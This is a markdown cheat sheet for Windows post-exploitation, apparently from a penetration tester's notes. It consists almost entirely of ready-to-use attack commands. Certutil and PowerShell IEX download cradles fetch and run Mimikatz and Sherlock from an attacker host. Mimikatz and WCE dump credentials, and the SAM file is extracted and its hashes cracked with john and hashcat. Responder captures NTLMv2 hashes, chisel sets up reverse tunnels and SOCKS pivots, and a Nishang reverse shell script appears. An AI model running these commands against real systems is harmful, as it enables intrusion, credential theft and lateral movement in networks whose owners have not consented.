# Windows Post-Exploit

- [Windows Post-Exploit](#windows-post-exploit)
- [Execution Remote Code](#execution-remote-code)
  - [Winrm](#winrm)
- [Switch user](#switch-user)
  - [Powershell](#powershell)
  - [Tool](#tool)
- [Privilege-escalation](#privilege-escalation)
  - [Tools](#tools)
  - [Msf](#msf)
  - [Windows-exploit-suggester](#windows-exploit-suggester)
  - [Sherlock](#sherlock)
- [Chisel](#chisel)
  - [Port forwarding](#port-forwarding)
  - [Traffic forwarding](#traffic-forwarding)
- [Dump Password](#dump-password)
  - [Windows Credentials Editor](#windows-credentials-editor)
  - [Mimikatz](#mimikatz)
  - [Crack SAM + SYSTEM](#crack-sam--system)
- [Nishang](#nishang)
- [Responder](#responder)


# Execution Remote Code 


1. Certutil:

        certutil -urlcache -split -f http://IP_ADDRESS/PowerLine.exe PowerLine.exe
        PowerLine.exe Invoke-Mimikatz "Invoke-Mimikatz -Command \"'\"sekurlsa::logonPasswords'\"\""
2. Powershell

        powershell "IEX (New-Object Net.WebClient).DownloadString('http://IP_ADDRESS/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
3. IEX

        IEX (New-Object Net.WebClient).DownloadString('http://IP_ADDRESS/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "misc::memssp"'
        
4. WebRequest

        Invoke-WebRequest -Uri http://IP_ADDRESS/WinNC.exe -outfile WinNC.exe

## Winrm

    ruby evil-winrm.rb -i IP_ADDRESS -u USERNAME -P 5985 -p PASSWORD
    > menu

# Switch user 

## Powershell 

```powershell
$username='batman'
$password='Zx^#QZX+T!123'
$securePassword=(ConvertTo-SecureString $password -AsPlainText -Force)
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```

## Tool

    WinNC.exe IP_ADDRESS PORT -u USERNAME -p PASSWORD [cmd|pwd|rtcp]

# Privilege-escalation

## Tools

    winPEAS.exe

## Msf

    run post/multi/recon/local_exploit_suggester

## Windows-exploit-suggester

	windows-exploit-suggester --update
	windows-exploit-suggester -i SYSTEMINFO -d 2020-07-08-mssb.xls

|Code|Info|
|-|-|
|[E]| Exploit |
|[M]| Metasploit modules|

## Sherlock

	iex(new-object net.webclient).downloadstring('http://IP_ADDRESS/Sherlock.ps1')
    Find-AllVulns



# Chisel

## Port forwarding

> Client

    chisel client 10.10.15.18:6666 R:7777:127.0.0.1:8443

> Server
> 
    chisel server -p port --reverse
Connect:

    https://127.0.0.1:7777

## Traffic forwarding

> Client (Commando)
> 
    1.chisel server -p 8000 -reverse
    4.chisel.exe client 127.0.0.1:8001 socks

> Server (windows )

    2.chisel.exe client 10.14.14.39:8000 R:8001:127.0.0.1:1337
    3.chisel server -p 1337 --socks5

nano /etc/proxychains.conf

    socks5         127.0.0.1 1080





# Dump Password
## Windows Credentials Editor

Drop those **file** to the target computer 

    /usr/share/wce/wce_x64.exe
    /usr/share/wce/wce.exe
    
## Mimikatz

Drop those **Directory** to the target computer

    /usr/share/mimikatz/Win32
    /usr/share/mimikatz/x64


Powershell code 

    /usr/share/mimikatz/Invoke-Mimikatz.ps1
    
## Crack SAM + SYSTEM 

samdump2 system sam > hash 

> John 

    john hash

> Hashcat 

    cat dumpHash | cut -d ":" -f 4 | sort | uniq > ntlm.txt
    hashcat -m 1000 -a 3 ./ntlm.txt -w 3 rockyou.txt

# Nishang
Pentest tools and script (Backdoor/Bypass/PrivEscal/MITM/Pivot/Scan/InfoGather)
(https://github.com/samratashok/nishang.git)


Drop this **Directory** to the target computer


    /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
    
# Responder

To listen 

    responder -i ens33 -f 


Path of the hash 


    cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt

Crack the hash 


    john /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt


    john --wordlist ~/Desktop/passwd.lst /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt --format=netntlmv2

Get cracked Password

    john --show /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt 


    ~/.john/john.pot



https://book.hacktricks.xyz/windows/windows-local-privilege-escalation